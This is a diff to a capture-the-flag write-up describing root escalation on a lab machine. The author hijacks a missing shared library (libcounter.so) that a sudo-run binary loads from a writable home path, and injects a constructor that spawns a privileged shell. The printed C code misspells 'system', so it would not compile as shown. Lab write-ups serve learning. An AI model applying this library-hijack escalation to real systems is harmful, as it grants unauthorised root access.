@@ -180,4 +180,44 @@ it is a software for stock management but it is protected by a password in this 
 	}
 	iVar1 = strcmp(param_1,"[REDACTED]");
   	return iVar1 == 0;
-we now have the password we now need to undestand what is doing and if we can hijack some function.
+we now have the password we now need to undestand what is doing on with the rest of the code, like some external library loading and stuff like that.
+so i launched the _strace_ command on the machine to see the actual 'backend' of the binary as it is executing.
+		
+	strace /usr/bin/stock
+output:
+		
+	write(1, "Enter the password: ", 20Enter the password: )    = 20
+	read(0, 
+the programm is basically waiting for the password but from the disassemble of the code we found it and we can go on:
+		
+	"[REDACTED]\n", 1024)         = 13
+	openat(AT_FDCWD, "/home/[REDACTED]/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+the binary is now searching a library called libcounter.so that isn't found so maybe we can inject this library, also the path is inside our home directory
+so let's begin the hijacking.
+I first googled how to create a .so (shared library object)
+and here chatgpt came to our aid:
+		
+	gcc -shared -o libcounter.so -fPIC libcounter.c
+with this command we can create a shared library object,
+but before this we need to create the libcounter.c file:
+
+	//libcounter.c	
+	#include <stdio.h>
+	#include <stdlib.h>
+
+	__attribute__((constructor))
+	int main(){
+		sytem("bash -p");
+		return 0;
+	}
+so now we can compile the library with the command above and copy the created library to the path that the binary calls:
+		
+	cp libcounter.so /home/[REDACTED]/.config/
+now everything is ready and we can execute the script with sudo, insert the password and we are root!!
+		
+	root@zipping:/root# echo pwned
+
+
+
+
+
